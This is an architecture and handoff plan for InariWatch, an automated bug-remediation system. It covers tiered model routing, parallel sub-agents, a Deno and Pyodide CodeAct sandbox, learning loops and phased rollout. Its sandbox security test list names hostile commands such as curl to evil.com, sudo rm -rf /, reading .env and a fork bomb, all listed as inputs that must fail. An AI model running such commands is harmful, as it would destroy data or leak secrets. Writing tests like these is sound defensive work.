# InariWatch Remediation System Architecture

> **Handoff document.** Master architecture for the InariWatch remediation system. This document is self-contained. A fresh Opus 4.7 max-effort session with no prior context of this codebase should be able to read this doc top-to-bottom and understand the full system design.
>
> This document **supersedes** both `PROGRAMMATIC_TOOL_CALLING_PLAN.md` and `GPT54_AGENT_OPTIMIZATION_PLAN.md`. Those plans optimized an existing pipeline under time pressure. This plan redesigns the pipeline assuming (a) team implementation bandwidth, (b) unlimited time, (c) Opus 4.7 max-effort executing agent work.
>
> **Companion documents (read together):**
> - `SDK_PEER_ARCHITECTURE.md` — the SDK-side of the system (enhanced path)
> - `PROTOCOL_SPEC.md` — the bidirectional protocol between cloud and SDK
> - `SECURITY_AND_COMPLIANCE_ROADMAP.md` — security stack, Incident Response Plan, path to SOC2
>
> **Date written:** 2026-04-22
> **Owner:** Jesus Bernal (@JesusBrDev)
> **License model:** Open protocol, cloud subscription paywall (Option B — Tailscale-style)
> **Implementation model:** Team + Opus 4.7 max-effort; fases ordered by technical dependency, not by calendar

---

## 0. Goal

Design a remediation system that, when mature, delivers:

- **p50 wall time: 8-15s** (today: 150-220s)
- **p95 wall time: 60-90s** (today: 280-350s)
- **Success rate: 88-92% across Tier 2, 85%+ Tier 1, 90%+ Tier 3**
- **Cost per remediation: $0.05-0.10** (today: $0.25)
- **Continuous improvement** — quarterly eval gains on golden dataset without prompt edits

The system should feel to users like *"I push code, a bug happens, it's already fixed before I see the alert."* That is the product.

---

## 1. Why a rewrite, not an optimization

The current pipeline works but has 3 structural limits that patches cannot remove:

1. **Single-agent bottleneck.** Every alert goes through the same 40-turn container agent whether it's a null check or a race condition. That's like using a neurosurgeon to put on band-aids.
2. **Serial exploration.** One agent reads file → thinks → reads file → thinks. Each "thinks" is 2-4s TTFT. No paralellism within a remediation.
3. **Stateless memory.** Every remediation starts from zero. The system does not learn from its own fixes beyond the opt-in Community Fix Network.

A system that hits the targets above must:
- Route intelligently by difficulty (Pillar 1)
- Parallelize by hypothesis (Pillar 2)
- Think in code, not JSON (Pillar 3)
- Learn continuously (Pillar 4)

---

## 2. The 4 Pillars

### Pillar 1 — Tiered Intelligence Routing

A classifier picks one of 4 tiers. Each tier has a dedicated agent with different cost/latency/success profile.

| Tier | Name | p50 | AI calls | Success target | Expected share |
|---|---|---|---|---|---|
| **0** | Pattern Match | 500ms | 0 | 95%+ on matched | 15-25% |
| **1** | Single-shot Fix | 5-15s | 1 | 85%+ | 40-50% |
| **2** | Agentic + CodeAct | 30-50s | multi-turn | 88-92% | 25-35% |
| **3** | Multi-agent Fan-out | 60-90s | parallel turns | 90%+ complex | 5-10% |

**Router design.** Classifier runs on `gpt-5-nano` initially. Features extracted from the alert:
- Stack trace depth + shape (short = trivial, deep = complex)
- File count referenced in stack trace
- Error category (TypeError, ReferenceError, Runtime, Network, DB, Auth, etc.)
- Severity score
- Historical pattern match confidence (pgvector cosine similarity against `pattern_memory`)
- Runtime context richness (does Capture SDK have breadcrumbs? Substrate recording? Git state?)
- Previous remediations for this fingerprint (bypass to known-good tier)

**Router learning loop.** Every completed remediation feeds back:
- `tier_used`, `success`, `wall_time_s`, `cost_usd`, `escalated_to_higher_tier`
- Weekly retrain of classifier on (features → optimal tier) pairs
- Classifier learns to prefer cheaper tiers when it can, escalates when it must

**Tier 0 in detail.** Deterministic fix engine:
- Pre-computed embeddings on `community_fixes` + `fix_replay_embeddings` + `golden_dataset_v4`
- Incoming alert → embed error fingerprint → pgvector ANN lookup
- If `cosine_similarity > 0.92` **and** matching fix has `confirmed_success_count >= 3` in last 30 days → apply patch directly
- Self-healing: any Tier 0 patch that fails 3x in post-merge monitor → demote and flag for review

**Tier 1 in detail.** Single-shot LLM:
- Pre-gathered context: file diffs from git blame on stack trace lines, last 3 related Capture breadcrumbs, matching community fix (if any with 0.85-0.92 similarity — below Tier 0 threshold but useful as hint)
- One call to `gpt-5-mini` with `reasoning: medium` and a prompt specifically engineered for the error category (7-10 specialized prompt templates)
- Output: patch + confidence score + explanation
- If confidence < 0.75 → escalate to Tier 2

**Tier 2 in detail.** Covered in Pillar 2.

**Tier 3 in detail.** Covered in Pillar 2 (extended).

---

### Pillar 2 — Speculative Parallel Exploration

Tier 2 and Tier 3 replace the single-agent-serial model with multi-agent-parallel.

**Tier 2 flow:**
1. **Hypothesis generation** (1 turn, `gpt-5-mini`): model outputs 3-5 candidate hypotheses about where the bug lives:
   ```
   H1: null check missing in auth middleware (src/auth/*)
   H2: race condition in session refresh (src/session/*)
   H3: timezone bug in cron scheduler (src/cron/*)
   ```
2. **Parallel sub-agents** (3-5 concurrent containers from pool): each sub-agent gets one hypothesis + tools scoped to the relevant files + CodeAct sandbox access (see Pillar 3).
3. **Race-to-winner**: first sub-agent to produce a patch that passes `tsc --noEmit` + local tests wins. Others receive kill signal and clean up.
4. **Aggregator fallback**: if no winner after N turns, aggregator runs a single strong-model pass with the aggregated evidence from all 3 sub-agents.

**Tier 3 flow:** Same as Tier 2 but N=5 sub-agents, no time limit per sub-agent (Tier 3 is for "hard" bugs where we accept longer wall time), and an explicit "synthesis" coordinator agent that considers combining approaches from multiple sub-agents rather than just picking one.

**Why this is the right design:**
- Wall time = max(sub-agent times), not sum.
- Hypothesis coverage: 3 hypotheses > 1 linear exploration.
- Matches Anthropic's multi-agent research findings: 15x token cost for 60-80% faster completion on complex tasks. At our target tier mix, 15x of 5-10% is ~1x total overhead.

**Infra requirements:**
- Container pool (Fase 2) with capacity for N=5 concurrent containers per remediation
- Sub-agent isolation: each has its own container + its own working directory, no cross-contamination
- Messaging: coordinator + sub-agents communicate over Redis pub/sub, no direct tool handoff

---

### Pillar 3 — CodeAct as Intra-Agent Default

The standard agentic loop emits tool_use JSON one call at a time. Every call = full HTTP round-trip to OpenAI = 2-4s TTFT + output.

**CodeAct replaces this.** Inside every Tier 2/3 sub-agent, "a turn" is not "one tool call" — it's **a Python script executed in a sandboxed subprocess** that orchestrates multiple tool calls in local logic.

Example single turn:
```python
# Sub-agent exploring hypothesis H1 (null check in auth middleware)
files = await asyncio.gather(
    read_file("src/auth/middleware.ts"),
    read_file("src/auth/session.ts"),
    search_code("getUser\\(", "src/auth/**")
)

# Analysis in Python — free, instant, zero tokens
bug_location = find_null_deref(files)

if bug_location:
    patch = build_patch(bug_location)
    await apply_patch(patch)
    tsc = await run_command("npx tsc --noEmit")

    if not tsc.passed:
        patch = await ask_llm_for_fix(tsc.output)
        await apply_patch(patch)

    tests = await run_command("npm test")
    result = {
        "fixed_file": bug_location.file,
        "tsc_ok": tsc.passed,
        "tests_ok": tests.passed,
        "confidence": 0.87
    }
else:
    result = {"hypothesis_failed": True, "evidence": files[:500]}
```

**One CodeAct turn = 5-10 tool operations. Agent turns drop from 30-40 to 4-8. Wall time on agentic path drops 60-70%.**

**Sandbox architecture (Fase 5):**
- Runner: **Deno subprocess** with `--allow-none --allow-read=/opt/sandbox` (zero ambient permissions)
- Inside Deno: **Pyodide** loads Python, model's code runs there
- Tools exposed via Pyodide FFI as async JS functions that proxy over JSON-RPC stdin/stdout to the parent Node.js worker
- Parent worker enforces every tool call against existing validators: `BLOCKED_FILE_PATTERNS`, `ALLOWED_COMMANDS`, path traversal guards, etc.
- Adversarial test suite (minimum 8 tests) runs on every CI PR that touches sandbox code

**Why Deno + Pyodide (not vm2, not plain Node):**
- `vm2` deprecated, had CVSS 9.8 CVE in Jan 2026
- Pyodide-in-Node FFI proven escapable (CVE-2025-68668)
- Deno's `--allow-none` denies everything by default; if Pyodide escaped, the Deno process still can't spawn, read FS, or egress
- Triple-layered defense: Deno + Pyodide + existing gVisor/mitmproxy container (from PR #8)

**Security rules (non-negotiable):**
1. All tool authorization in parent, never in sandbox
2. Never template model-controlled strings into the Python code (model writes full code string, pass as-is)
3. 60s wall-clock per sandbox invocation, 256MB memory cap, 64KB stdout cap
4. Every sandbox invocation logged to `ai_usage_logs` + `sandbox_audit_log`
5. Monthly CVE review for Deno + Pyodide versions

---

### Pillar 4 — Continuous Learning Loop (the moat)

Competitors can copy Pillars 1-3 in 6-12 months. They cannot copy Pillar 4 because it compounds with data volume, and you'll have 6-18 months of lead time.

**Four nested loops:**

**Loop 1 — Pattern Memory (per-project):**
- Every successful fix embedded and stored: `(project_id, error_fingerprint, fix_strategy, files_touched, outcome, confidence, post_merge_health)`
- New alerts in same project first query pattern memory
- `recall_confidence > 0.85` → skip to Tier 1 with hint ("this looks like fix X from 2 weeks ago")
- Decay policy: patterns unused for 90 days drop priority; patterns that fail post-merge 3x get disabled

**Loop 2 — Cross-project Community Patterns (amplified):**
- Today: opt-in, manual contribution via Community Fix Network
- New design: auto-contribution after (a) confidence > 90%, (b) substrate_replay passed, (c) 7 days post-merge no revert
- Anonymization: strip project names, file paths hashed, variable names alpha-renamed, stack traces sanitized
- Cross-project consumer: every Tier 0/1 lookup also checks community patterns
- Network effect: with N projects on the platform, each project gains from N-1 others' bug experiences

**Loop 3 — Fine-tune Dataset Generation:**
- Every successful remediation = one row of high-quality training data
- Schema: `{ alert: Alert, pre_state: RuntimeState?, context: Context, tool_trace: ToolCall[], final_patch: Patch, post_merge_health: Health }`
- When SDK peer mode is enabled (`SDK_PEER_ARCHITECTURE.md`), `pre_state` and `post_state` come from the user's actual runtime — this is the secret sauce for a best-in-class model
- Export to JSONL weekly; target: 10k clean examples by month 12, 50k by month 24
- Fine-tune triggers at 10k examples (see Fase 10)

**Loop 4 — Prompt + Policy Auto-Optimization:**
- OpenAI Graders API runs golden dataset on every prompt change
- Failed remediations → hypothesis generator proposes prompt delta → A/B test on next 50 alerts → promote if improvement, revert if regression
- "DSPy-style" auto-optimization on your own prompts
- Prompt catalog versioned; every prompt change is reviewable PR

---

## 3. Architecture Diagram

```
┌────────────────────────────────────────────────────────────────┐
│                     Alert ingestion                            │
│  (Capture SDK + 6 pollers + webhooks Sentry/Vercel/GH/DD/Expo) │
│                                                                │
│  Per alert, Capture SDK may attach (if peer mode enabled):     │
│   - Runtime state snapshot                                     │
│   - Last 50 breadcrumbs                                        │
│   - Substrate I/O recording                                    │
│   - Git HEAD + dirty flag                                      │
└────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────┐
│              Fingerprint + Dedup (Redis)                       │
│  24h sliding window; SET NX fast-path for duplicates           │
└────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────┐
│       Pattern Memory Lookup (pgvector, Loop 1 + 2)             │
│                                                                │
│  confidence > 0.92 AND success_count >= 3 → Tier 0 direct      │
│  confidence 0.85-0.92 → Tier 1 with hint                       │
│  confidence < 0.85 → Router decides                            │
└────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────┐
│           Tier Router (gpt-5-nano initial, fine-tuned later)   │
│                                                                │
│  Features: stack depth/shape, file count, error category,      │
│  severity, pattern match score, runtime context richness,      │
│  SDK peer enabled?, historical fix time for this fingerprint   │
└────────────────────────────────────────────────────────────────┘
          │           │               │                │
          ▼           ▼               ▼                ▼
    ┌─────────┐ ┌──────────┐ ┌─────────────────┐ ┌────────────────┐
    │ Tier 0  │ │ Tier 1   │ │ Tier 2          │ │ Tier 3         │
    │ Pattern │ │ Single   │ │ Agentic +       │ │ Multi-agent    │
    │ Apply   │ │ Shot     │ │ CodeAct         │ │ Fan-out (5x)   │
    │         │ │ mini     │ │ mini→5.4        │ │ parallel       │
    │ 500ms   │ │ 5-15s    │ │ 30-50s          │ │ 60-90s         │
    │         │ │          │ │                 │ │                │
    │         │ │ * SDK    │ │ * SDK peer      │ │ * SDK peer     │
    │         │ │   peer = │ │   container     │ │   parallel     │
    │         │ │   3-5s   │ │   setup = 0s    │ │   over runtime │
    └─────────┘ └──────────┘ └─────────────────┘ └────────────────┘
          │           │               │                │
          └───────────┴───────────────┴────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────┐
│          17 Auto-merge gates (parallelized — Fase 8)           │
│                                                                │
│  Serial (dependency chain):                                    │
│   - CI pass (external blocking)                                │
│   - Self-review-cheap → self-review-strong escalation          │
│                                                                │
│  Parallel (Promise.all):                                       │
│   - substrate_simulate, eap_chain, prediction, security_scan   │
│   - fleet, perf, drift, compliance, cost, env, container_verify│
│                                                                │
│  Early-abort: any HARD gate failure kills the chain            │
└────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────┐
│           Pre-push strict gate (Fase 4)                        │
│           Worker runs tsc --noEmit + npm test + lint           │
│           In-container, ~15-30s                                │
└────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────┐
│              Git push + CI (webhook-driven, Fase 4)            │
│         check_run.completed triggers next step                 │
└────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────┐
│                    Auto-merge                                  │
└────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────┐
│            Post-merge monitoring (10 min)                      │
│              + Continuous Learning Loops                       │
│                                                                │
│  Loop 1-2: pattern memory write, community contribute          │
│  Loop 3: fine-tune dataset row (runtime state if peer)         │
│  Loop 4: grader measurement on golden dataset delta            │
│                                                                │
│  If regression detected → auto-revert + escalate to on-call    │
└────────────────────────────────────────────────────────────────┘
```

---

## 4. The 13 Fases — Ordered by Technical Dependency

Each fase has **acceptance criteria**, not a calendar date. A fase is complete when its acceptance criteria are satisfied under eval.

### Fase 1 — Telemetry Foundation

**Why first:** no data → no decisions. Every subsequent fase depends on this.

**Work:**
- Migration: `ai_usage_logs` gains columns `turn_number INTEGER, ttft_ms INTEGER, phase TEXT, model_tier TEXT, tool_name TEXT, tool_exec_ms INTEGER, reasoning_tokens INTEGER`
- Migration: `remediation_sessions` gains `tier_used TEXT, hypothesis_count INTEGER, pattern_match_score FLOAT, sandbox_mode TEXT, sdk_peer_enabled BOOLEAN`
- New table: `sandbox_audit_log` (every CodeAct sandbox invocation: code hash, purpose, result size, duration, success)
- New table: `pattern_memory` (pgvector 1024D, per-project)
- New widget `/admin/remediation-lab`: wall-time histogram by tier, cost attribution by phase, model mix over time, p50/p95 trend
- OpenAI Graders API integration: `runGoldenDataset(modelConfig): GraderReport`

**Acceptance:**
- Can answer "what's the p50 wall time for Tier 2 remediations in the last 7 days?" from the UI
- Can answer "what is the cache hit rate on OpenAI calls for feature X this week?"
- Graders API call on `golden-dataset-v4` produces report in < 5 min

### Fase 2 — Infrastructure Upgrade

**Why next:** Pilar 2 parallelism requires capacity; container pool requires disk.

**Work:**
- Migrate Hetzner CX22 → **CX52** (16 vCPU, 32GB RAM, 240GB disk)
- Plan: 30-60min window, Kamal rolling deploy, Cloudflare DNS TTL drop to 60s during cutover, rollback = repoint DNS to CX22 (kept warm 7 days)
- Optional post-migration: 2nd CX32 as dedicated worker node (web on primary, worker on secondary) — only if Fase 2 shows CPU contention
- Container pool endpoints on Go staging server:
  - `POST /pool/warm {projectId, repo, ref}` — pre-hydrate
  - `POST /pool/checkout {projectId}` — return containerId pre-hydrated
  - `POST /pool/return {containerId, healthStatus}` — mark eligible for rehydration
- Pool rehydration cron: every 15 min, scan top 50 active projects (last 7 days), ensure 2-3 warm containers each
- Pool eviction policy: LRU by `last_used_at`, cap at 40 warm containers total

**Acceptance:**
- `POST /pool/checkout` returns a pre-hydrated containerId in < 3s (p95)
- Warm pool contains 2+ containers for top 30 active projects at all times
- Disk usage on CX52 < 60% under normal load
- Rollback to cold path works via `CONTAINER_POOL_ENABLED=false`

### Fase 3 — Model Routing Refinement

**Work:**
- New helper in `web/lib/ai/models.ts`: `resolveModelForPhase(phase, provider)`
- Phase boundary logic in `worker/src/container-agent.ts`: `explore → fix` transition on first `apply_patch` tool call OR explicit `think` with file path declaration
- On transition: compact messages[] via existing compaction, reset thread (new `previous_response_id` sequence)
- Model map:
  - `classify / triage / auto-analyze / correlate` → `gpt-5-mini` (reasoning: minimal)
  - `explore` turns → `gpt-5-mini` (reasoning: low)
  - `fix` turns → `gpt-5.4` (reasoning: medium)
  - `final 3 turns` → `gpt-5.4` (reasoning: high)
  - Router classifier → `gpt-5-nano` (reasoning: minimal)
- HTTP keep-alive: install `undici` Agent in worker + web AI client path with `connections: 32, pipelining: 1, keepAliveTimeout: 30_000`

**Acceptance:**
- Shadow-run on 100+ alerts with flag `REMEDIATION_MODEL_ROUTING=true` shows:
  - Success rate delta ≥ -2% vs current (i.e., not worse)
  - p50 wall time reduced by ≥ 15%
  - Cost per remediation reduced by ≥ 25%
- Kill switch: `REMEDIATION_MODEL_ROUTING=false` reverts entire behavior instantly

### Fase 4 — Pre-push Strict + Webhook CI

**Work:**
- In `worker/src/container-agent.ts` after final `apply_patch`, before `git push`:
  - Run `tsc --noEmit` inside container (60s budget)
  - If tsconfig exists and has tests: run `npm test --silent` (90s budget)
  - Run `npm run lint` if lint script exists (30s budget)
  - On fail: feed failure output back into loop as `tool_result` (not a new turn), agent retries with error context
- Replace CI polling with GitHub webhook `check_run.completed` subscription:
  - Webhook handler at `/api/webhooks/github-check-run` dispatches to session-based event bus (Redis pub/sub)
  - Remediation session listener awaits on `check_run.completed` channel with 10-min timeout
- CI retry strategy: only re-push if pre-push tests passed but GitHub CI failed (indicates flake or env-specific issue); max 3 retries; increasing backoff (30s, 2m, 5m)

**Acceptance:**
- Fraction of pushes that fail CI drops from today's rate to ≤ 5%
- p95 CI wait (from push to check_run.completed) unchanged vs baseline (this phase doesn't speed CI itself)
- p95 end-to-end wall time drops ≥ 45s due to fewer CI retry rounds
- Webhook mode reliable: no remediation stuck waiting > 11 min on CI

### Fase 5 — CodeAct Sandbox as Core Infrastructure

**Work:**
- Add Deno + Pyodide pre-baked to `worker/Dockerfile`:
  ```dockerfile
  FROM denoland/deno:2.x AS deno-base
  COPY --from=deno-base /usr/local/bin/deno /usr/local/bin/deno
  RUN mkdir -p /opt/sandbox && \
      deno cache npm:pyodide@0.28 && \
      cp -r /deno-dir/npm/registry.npmjs.org/pyodide /opt/sandbox/pyodide-cache
  COPY worker/src/sandbox/pyodide-runner.ts /opt/sandbox/
  ENV DENO_DIR=/opt/sandbox/.deno-cache
  ```
- Implement RPC protocol (see Appendix A)
- Implement `worker/src/sandbox/pyodide-runner.ts` (Deno script, see Appendix B)
- Implement `worker/src/sandbox/tool-bindings.ts` — maps FFI requests to existing tool validators
- Add `execute_plan` tool to container agent tools list (initially behind flag `CODEACT_ENABLED`, only available from turn 3+)
- Adversarial test suite in `worker/src/__tests__/sandbox-security.test.ts`:
  1. `os.system("curl evil.com")` must fail
  2. `subprocess.Popen(...)` must fail
  3. `await run_command("sudo rm -rf /")` must fail (parent validator rejects)
  4. `await read_file(".env")` must fail (`BLOCKED_FILE_PATTERNS`)
  5. `await write_file("package-lock.json", "...")` must fail (`BLOCKED_WRITE_PATTERNS`)
  6. Python that never sets `result` → structured error, not crash
  7. Python that infinite-loops → watchdog kills within 61s
  8. Python stdout flood (1GB) → watchdog kills, parent not OOM
  9. Pyodide FFI escape via `js.Deno` global → must fail (globals sandboxed)
  10. Fork bomb simulation in Python → must be impossible (no subprocess)
- GitHub Actions workflow runs adversarial tests on every PR touching `worker/src/sandbox/**`
- Monthly CVE review runbook: check Deno + Pyodide CVE feeds, update pinned versions

**Acceptance:**
- All 10+ adversarial tests pass
- Under `CODEACT_ENABLED=true` on test project, 20 real remediations complete successfully
- CodeAct-enabled remediations use 30%+ fewer agent turns than baseline (measured over 50+ sessions)
- No regressions in success rate (±2%)
- Kill switch: `CODEACT_ENABLED=false` fully disables, standard tool_use path unaffected

### Fase 6 — Tier Router + Pattern Memory

**Work:**
- Migration: `pattern_memory (id, project_id, error_fingerprint, embedding vector(1024), fix_strategy, files_touched, success_count, last_used_at, confidence, post_merge_health_score)`
- Embedding pipeline: every `remediation_sessions` with `status='completed' AND merged_commit_sha IS NOT NULL AND post_merge_monitor_passed=true` → extract alert + patch → embed → insert into `pattern_memory`
- `lib/ai/pattern-memory.ts` service:
  - `lookupPattern(alert): { score, suggestedFix, fromCommunity: boolean }`
  - `writePattern(session, outcome)`
  - `decayPattern(patternId)` — exponential decay after 90 days idle
  - `disablePattern(patternId)` — after 3 consecutive post-merge failures
- Tier Router implementation: `lib/ai/tier-router.ts`
  - Feature extraction: `extractRouterFeatures(alert, context): FeatureVector`
  - Classifier call: `gpt-5-nano` with structured output `{ tier: 0|1|2|3, reason: string, confidence: number }`
  - Initial heuristic fallback if classifier low-confidence: rule-based router using hand-crafted thresholds
- Tier 0 handler: direct pattern apply without LLM
- Tier 1 handler: single-shot prompt with error-category-specialized templates
- Integration: `remediate.ts` entry point checks pattern memory first, then calls tier router, then dispatches to tier handler

**Acceptance:**
- Classifier agreement with human labeling on 100 sample alerts ≥ 85%
- Tier 0 hit rate ≥ 10% after 4 weeks of live traffic (grows to 20-30% target over months)
- Tier 1 success rate ≥ 80% on first attempt
- System can fall back: Tier 1 fail → escalate to Tier 2; logged in telemetry
- `TIER_ROUTER_ENABLED=false` returns to Tier 2-only (baseline)

### Fase 7 — Multi-agent Fan-out (Tier 2 at N=3, Tier 3 at N=5)

**Work:**
- Hypothesis generation step: `lib/ai/hypothesis-generator.ts` calls `gpt-5-mini` with alert context, returns `Hypothesis[]` (3-5 items with scope + reasoning)
- Parallel sub-agent spawning in `worker/src/multi-agent-coordinator.ts`:
  - Coordinator acquires N containers from pool simultaneously
  - Each sub-agent gets: hypothesis, scoped tools (file glob), CodeAct sandbox, 10-turn budget
  - Sub-agents communicate results to coordinator via Redis pub/sub channel `remediation:{sessionId}:results`
- Race-to-winner logic:
  - First sub-agent to emit `submit_fix` with `passed_tsc=true AND passed_tests=true` wins
  - Coordinator sends `CANCEL` to other sub-agents; they clean up their containers
  - Winner's container becomes the "remediation container" for gates phase
- Aggregator fallback (if no winner after all sub-agents exhaust budget):
  - Combine evidence from all sub-agents
  - Single strong-model pass (`gpt-5.4`, high reasoning) with aggregated context
  - Fallback success counted separately in telemetry

**Acceptance:**
- Tier 2 success rate improves by ≥ 3% vs Fase 3 single-agent baseline
- Tier 3 success rate ≥ 85% on complex golden dataset subset
- Wall time on Tier 2: p50 ≤ 50s (from Fase 3's ~35-45s — slight regression acceptable if success rate up)
- Wall time on Tier 3: p50 ≤ 100s
- Fan-out controlled by flag `MULTI_AGENT_FANOUT=true`; off = single-agent only

### Fase 8 — Auto-merge Gate Parallelization

**Work:**
- Analyze dependency graph of the 17 gates — document in `docs/gates-dependency.md`
- Rewrite `lib/ai/auto-merge-gates.ts` from sequential chain to DAG executor:
  - Gates declared with `dependsOn: GateName[]`
  - Executor uses topological sort + `Promise.all` on independent sets
  - Hard-fail gates (e.g., `CI_PASS`, `SECURITY_SCAN_NO_HIGH`) trigger early-abort of remaining gates
- Independent gates identified (candidate parallel set):
  - `substrate_simulate`, `eap_chain_verified`, `prediction_safe`, `security_scan_clean`, `fleet_compatible`, `perf_regression`, `drift_ok`, `compliance_pass`, `env_safe`, `cost_budget`
- Serial gates:
  - `ci_pass` (depends on external GitHub Actions)
  - `self_review_escalation` (strong review only if cheap review scored 40-70)

**Acceptance:**
- Gates phase wall time drops ≥ 60% (target: from ~15s to ~6s p50)
- No regression in gate accuracy (no new false-pass merges)
- Early-abort saves work: when `SECURITY_SCAN` hard-fails, remaining gates don't run
- Rollback: `GATES_PARALLEL=false` restores serial order

### Fase 9 — Continuous Learning Loops

**Work:**
- **Loop 1 activation:** pattern memory writes from Fase 6 already exist; add decay + disable policies
- **Loop 2 activation:** auto-contribution pipeline:
  - Cron daily at 04:00 UTC: scan `remediation_sessions` from 8 days ago with `post_merge_health_score ≥ 0.9`
  - Anonymize: project name → null, file paths → hash, stack trace → sanitized, variable names → alpha-renamed (using babel/tree-sitter)
  - Embed anonymized pattern → insert into `community_patterns` table
  - Admin review queue for first 200 auto-contributions (manual spot-check before full automation)
- **Loop 3 activation:** fine-tune dataset pipeline:
  - Cron weekly (Sunday 03:00 UTC): export rows where `success=true AND post_merge_health_score ≥ 0.9`
  - Schema:
    ```jsonc
    {
      "alert": {...},
      "pre_runtime_state": {...} | null,  // populated if SDK peer was active
      "context": {...},
      "tool_trace": [{"tool": "read_file", "input": {...}, "output": "..."}],
      "final_patch": "...",
      "post_merge_health": {...}
    }
    ```
  - Output: `s3://inariwatch-ft-datasets/weekly-YYYY-MM-DD.jsonl`
- **Loop 4 activation:** prompt auto-optimization:
  - Framework `lib/ai/prompt-optimizer.ts`:
    - On CI PR touching `prompts.ts`: run golden dataset via Graders API
    - Require ≥ current-baseline score to merge
    - Auto-suggest improvements on failed cases (LLM-generated prompt deltas, human review required before merge)

**Acceptance:**
- Pattern memory has ≥ 500 entries after 60 days of live operation
- Community network has ≥ 200 auto-contributed entries after 90 days
- Weekly fine-tune dataset exports land in S3 successfully; row count grows week over week
- Graders score on golden dataset does not regress on any prompt merge

### Fase 10 — Fine-tuned Remediation Model

**Work:**
- Trigger: once dataset ≥ 10,000 clean examples
- **Path A (initial):** OpenAI fine-tuning on `gpt-5-mini` base, fine-tune for single-shot Tier 1 first (simplest input/output)
- **Path B (longer-term):** evaluate OSS candidates (Qwen 3 Coder 32B, StarCoder2 15B, DeepSeek Coder V3) for self-hosted fine-tuning on Hetzner GPU server
- Eval gate before shipping fine-tuned model:
  - Success rate on golden dataset ≥ 95% of baseline (`gpt-5.4`)
  - Cost per call ≤ 30% of baseline
  - TTFT ≤ 40% of baseline
  - Pass adversarial eval (prompt injection robustness)
- Staged rollout: 5% → 25% → 100% over 2 weeks, with auto-rollback on success rate drop
- Retraining cadence: quarterly initially, monthly once stable

**Acceptance:**
- Fine-tuned model deployed to 100% of Tier 1 traffic
- Cost per Tier 1 remediation drops ≥ 70% vs baseline
- Success rate stable within ±2%

### Fase 11 — Substrate + EAP as First-class Gates

**Work:**
- Substrate replay gate upgraded:
  - **AI analysis mode** (fast, 1-2s): LLM analyzes recording + patch for logical correctness
  - **Deterministic replay mode** (5-30s): actual I/O replay via Substrate runtime (requires SDK peer or GitHub Action)
  - Dual-gate: both must pass for merge
- EAP attestation chain:
  - Every successful remediation produces EAP receipt (Merkle proof of: alert → diagnosis → patch → test_results → merge)
  - Receipts stored in `eap_receipts` table
  - Public verification endpoint `/api/eap/verify/:receiptId` returns cryptographic proof
  - Optional public landing: "Every fix verified cryptographically — [live counter]"
- Integration with VAR vision (Q1+Q2 shipped): these gates are what differentiate InariWatch from observability-only products

**Acceptance:**
- 100% of successful remediations produce EAP receipt
- Deterministic replay mode passes on ≥ 60% of remediations with SDK peer enabled (others fall back to AI analysis)
- Public verify endpoint documented and functional

### Fase 12 — Observability + Operational Excellence

**Work:**
- Per-tier SLOs defined:
  - Tier 0: p95 ≤ 1s, success rate ≥ 95%
  - Tier 1: p95 ≤ 20s, success rate ≥ 85%
  - Tier 2: p95 ≤ 90s, success rate ≥ 88%
  - Tier 3: p95 ≤ 180s, success rate ≥ 85%
- Alerting in InariLens when SLO breach detected (e.g., Tier 1 p95 > 30s for 3 consecutive 5-min windows)
- Chaos engineering expansion: 14 k6 scenarios → 25+, covering:
  - Sandbox CVE simulation
  - Pattern memory poisoning (adversarial pattern injection)
  - Community fix abuse (malicious contribution)
  - Model regression (fine-tuned model starts failing)
  - Tier router classification attack
- Runbooks written:
  - `runbook/sandbox-cve.md` — how to respond if Deno or Pyodide CVE drops
  - `runbook/model-regression.md` — how to detect and roll back fine-tuned model
  - `runbook/pattern-poisoning.md` — how to detect malicious patterns in memory
  - `runbook/community-fix-abuse.md` — how to quarantine bad community contributions

**Acceptance:**
- Every SLO has alerting in InariLens
- 25+ chaos scenarios, all passing
- Runbooks tested via tabletop exercise

### Fase 13 — Product Surface

**Work:**
- Dashboard: each remediation shows tier used, model used, wall time breakdown, cost
- Settings: admin can tune router thresholds per workspace (advanced users)
- API: public REST + MCP tool `trigger_remediation_with_tier_hint(alert_id, tier: 0|1|2|3|auto)`
- Marketing landing: "How InariWatch works" explainer with tier breakdown
- Pricing page updated: Enterprise tier highlights SDK peer mode + certified fixes + cryptographic attestation

**Acceptance:**
- User can view tier + cost breakdown for any remediation
- User can override tier for a specific alert
- Marketing landing live and tested for conversion

---

## 5. Target Metrics (mature system, post-Fase 13)

| Metric | Today | Mature target |
|---|---|---|
| p50 wall time (all tiers) | 150-220s | **8-15s** |
| p95 wall time | 280-350s | **60-90s** |
| Tier 0 hit rate | 0% (no tier) | **20-30%** after 6 months |
| Tier 1 success rate | N/A | **85%+** |
| Tier 2 success rate | ~75-85% | **88-92%** |
| Tier 3 success rate | N/A | **90%+** |
| Cost per remediation | $0.25 | **$0.05-0.10** post fine-tune |
| Security incidents (sandbox) | 0 | 0 (maintain via adversarial CI) |
| Self-improvement velocity | 0 | Quarterly gain on golden dataset |

---

## 6. Decisions locked in (Jesus confirmed)

1. **Fine-tune path:** Stay on OpenAI API as default; evaluate OSS self-hosted in Fase 10 as secondary option (not committing to GPU server now).
2. **Community network scope:** Default-on with strict anonymization. Auto-contribute after post-merge health pass. This is a deliberate strategic bet — competitors can't legally match it.
3. **Fine-tune priority:** Router first (high ratio impact), remediation model second.
4. **Substrate + EAP positioning:** **First-class premium feature**, marketed explicitly. "Cryptographically-verified remediation" is the enterprise pitch.
5. **Licensing:** **Option B** — protocol open, SDK open-source (capture already on npm), premium features (peer mode, certified fixes) gated behind cloud subscription validation.
6. **Push cadence:** Removed. InariWeb absorbs build cost.
7. **Hetzner upgrade:** CX52 in Fase 2.
8. **SOC2:** Deferred to Year 2-3. Fase 12 delivers pre-SOC2 security stack (see `SECURITY_AND_COMPLIANCE_ROADMAP.md`).

---

## 7. ADRs (Architectural Decision Records)

### ADR-001: Deno + Pyodide over vm2 / isolated-vm
- **Status:** Accepted
